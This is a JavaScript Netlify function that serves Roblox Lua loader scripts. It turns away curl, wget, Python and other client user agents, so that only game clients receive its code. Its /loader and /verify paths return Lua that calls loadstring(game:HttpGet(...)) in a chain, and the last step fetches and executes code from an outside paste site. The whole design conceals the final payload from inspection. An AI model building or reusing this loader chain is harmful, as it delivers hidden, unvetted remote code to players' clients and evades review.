const ipAttempts = new Map();

function rateLimitCheck(ip) {
  const now = Date.now();
  const attempts = ipAttempts.get(ip) || [];
  const recent = attempts.filter(t => now - t < 60000);
  if (recent.length > 10) return true;
  recent.push(now);
  ipAttempts.set(ip, recent.slice(-15));
  return false;
}

export async function handler(event) {
  const headers = event.headers || {};
  const ua = headers["user-agent"] || "";
  const ip =
    headers["x-nf-client-connection-ip"] ||
    headers["x-forwarded-for"] ||
    "unknown";

  const path = event.path || "/";

  if (rateLimitCheck(ip)) {
    return { statusCode: 200, body: 'wait(60)' };
  }

  const badUAs = [
    'curl','wget','postman','python','node','java','go-http'
  ];

  if (badUAs.some(b => ua.toLowerCase().includes(b))) {
    return { statusCode: 200, body: 'error("blocked")' };
  }

  if (!ua.includes("Roblox")) {
    return { statusCode: 200, body: 'error("invalid")' };
  }

  if (path === "/.netlify/functions/loader") {
    const nonce = Math.floor(Math.random() * 1e9);
    const ts = Date.now();
    const key = (Math.floor(ts / 1000) ^ 0x5A5A) & 0xFFFF;

    return {
      statusCode: 200,
      headers: { "Content-Type": "text/plain" },
      body: `
local base = "${process.env.URL}"
local nonce = ${nonce}
local ts = ${ts}
local k = ${key}

local function calc()
  local x1 = bit32.bxor(nonce, k)
  local x2 = bit32.bxor(x1, ts % 10000)
  return x2 + ${Math.floor(ts / 1000) % 1000}
end

local p = calc()
loadstring(game:HttpGet(base .. "/.netlify/functions/verify?p=" .. p .. "&t=" .. ts))()
`
    };
  }

  if (path.includes("/verify")) {
    return {
      statusCode: 200,
      headers: { "Content-Type": "text/plain" },
      body: `
loadstring(game:HttpGet("https://ghostbin.axel.org/paste/tv9rj/raw"))()
`
    };
  }

  return { statusCode: 200, body: 'error("denied")' };
}
